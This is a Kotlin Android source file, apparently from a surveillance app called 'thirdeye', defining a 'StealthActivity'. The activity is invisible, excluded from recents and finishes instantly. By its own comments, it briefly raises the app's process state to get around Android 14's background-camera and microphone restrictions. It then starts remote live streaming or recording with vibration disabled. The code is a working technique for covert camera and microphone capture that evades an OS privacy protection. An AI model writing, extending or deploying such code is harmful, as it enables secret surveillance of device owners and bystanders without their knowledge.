package com.thirdeye.app.service

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log

/**
 * Invisible 1x1 activity that briefly transitions the process to PROC_STATE_TOP
 * so that Android 14 (API 34) Foreground Services can start with CAMERA and MICROPHONE
 * permissions without getting blocked by OS Background Camera policies.
 */
class StealthActivity : Activity() {

    companion object {
        private const val TAG = "StealthActivity"
        const val ACTION_START_LIVE = "com.thirdeye.app.STEALTH_START_LIVE"
        const val ACTION_START_RECORD = "com.thirdeye.app.STEALTH_START_RECORD"
        const val EXTRA_CAMERA_LENS = "extra_camera_lens"

        fun launchForLiveStream(context: Context, cameraLens: String = "BACK") {
            val intent = Intent(context, StealthActivity::class.java).apply {
                action = ACTION_START_LIVE
                putExtra(EXTRA_CAMERA_LENS, cameraLens)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            context.startActivity(intent)
        }

        fun launchForRemoteRecording(context: Context, cameraLens: String = "BACK") {
            val intent = Intent(context, StealthActivity::class.java).apply {
                action = ACTION_START_RECORD
                putExtra(EXTRA_CAMERA_LENS, cameraLens)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            }
            context.startActivity(intent)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // No animation to stay completely imperceptible
        overridePendingTransition(0, 0)

        val lens = intent.getStringExtra(EXTRA_CAMERA_LENS) ?: "BACK"

        when (intent.action) {
            ACTION_START_LIVE -> {
                Log.i(TAG, "🛡️ StealthActivity in TOP state: Starting LiveStreamService (Lens: $lens)")
                LiveStreamService.startService(this, lens)
            }
            ACTION_START_RECORD -> {
                Log.i(TAG, "🛡️ StealthActivity in TOP state: Starting CameraRecordingService (Lens: $lens)")
                CameraRecordingService.startService(
                    context = this,
                    enableVibration = false,
                    cameraLens = lens,
                    isRemote = true
                )
            }
        }

        // Instantly finish and dismiss
        finish()
        overridePendingTransition(0, 0)
    }
}
